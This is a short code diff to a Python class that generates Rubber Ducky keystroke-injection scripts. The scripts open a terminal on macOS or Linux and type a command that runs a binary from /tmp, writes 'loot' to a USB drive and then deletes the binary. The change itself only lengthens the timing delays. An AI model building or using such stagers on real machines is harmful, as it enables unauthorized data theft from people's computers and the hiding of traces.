@@ -130,7 +130,7 @@ class _BinaryMixin:
             )
             return (
                 'DELAY 700\nGUI SPACE\nDELAY 1000\nSTRING Terminal\nENTER\n'
-                'DELAY 4000\nDEFAULTCHARDELAY 10\n' + _ducky_type_line(cmd)
+                'DELAY 6000\nDEFAULTCHARDELAY 10\n' + _ducky_type_line(cmd)
             )
 
         cmd = (
@@ -141,7 +141,7 @@ class _BinaryMixin:
             '&&/tmp/pa --loot-out "$d/' + _USB_LOOT_FILE + '"'
             ';rm -f /tmp/pa;break;fi;done'
         )
-        return 'DELAY 700\nCTRL-ALT t\nDELAY 3500\nDEFAULTCHARDELAY 10\n' + _ducky_type_line(cmd)
+        return 'DELAY 700\nCTRL-ALT t\nDELAY 5000\nDEFAULTCHARDELAY 10\n' + _ducky_type_line(cmd)
 
     def _stager_script(self, target_os: str) -> str:
         return self._usb_drive_stager_script(target_os)
